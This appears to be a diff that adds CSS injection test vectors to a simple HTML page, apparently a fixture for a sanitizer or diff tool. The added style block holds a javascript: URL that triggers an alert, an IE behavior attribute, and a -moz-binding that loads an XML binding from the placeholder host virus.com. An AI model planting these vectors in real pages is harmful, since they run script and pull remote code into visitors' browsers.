@@ -1,4 +1,25 @@
+<html>
+<head>
+<style>
+body {
+        margin: 0px;
+        padding: 0px;
+        /* JS injection */
+        background-image: url(javascript:alert('Injected'));
+    }
+    a {
+        color: #ccc;
+        text-decoration: none;
+        /* dangerous proprietary IE attribute */
+        behavior:url(hilite.htc);
+        /* dangerous proprietary FF attribute */
+        -moz-binding: url('http://virus.com/htmlBindings.xml');
+    }
+</style>
+</head>
+<body>
 Hello World
 <p>
 This is now modified.
-
+</body>
+</html>
